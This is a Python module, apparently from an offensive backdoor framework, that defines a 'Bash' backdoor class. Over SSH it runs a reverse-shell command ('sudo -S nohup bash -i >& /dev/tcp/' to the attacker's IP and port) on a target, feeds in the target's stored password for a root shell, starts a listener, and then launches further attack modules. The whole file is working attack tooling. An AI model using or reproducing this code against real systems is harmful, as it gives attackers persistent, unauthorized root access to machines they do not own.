from backdoors.backdoor import *

class Bash(Backdoor):
    prompt = Fore.RED + "(bash) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Bash backdoor..."
        self.core = core
        self.options = {
                "port"   : Option("port", 53923, "port to connect to", True),
                }
        
        self.modules = {} 
        self.allow_modules = True
        self.help_text = INFO + "Uses a simple bash command to connect to a specific ip and port combination, and pipes its input into a bash shell." 

    def get_command(self):
        return "sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % self.get_value("port")

    def do_spawn(self, args): #this specific backdoor has a little extra because normally it prompts for the sudo password.
        if(hasattr(self, "child")):
            if(self.child.isalive()):
                print("Press Control + ] to exit the shell.")
                self.child.sendline(self.core.curtarget.pword)
                self.child.interact(escape_character='\x1d', input_filter=None, output_filter=None)
            else:
                print("The connection has been lost.")
        else:
            print("The exploit has not been run yet or does not support the interpreter.")

    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        print(GOOD + "Initializing backdoor...")
        #input(INFO + "Please create a listener with the command nc -v -n -l -p " + str(port))

        self.listen()
        time.sleep(.25)
        target.ssh.exec_command(self.get_command())
        print(GOOD + "Bash Backdoor on port " + str(port) + " attempted. You may need to input the password, which is " + target.pword)
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()

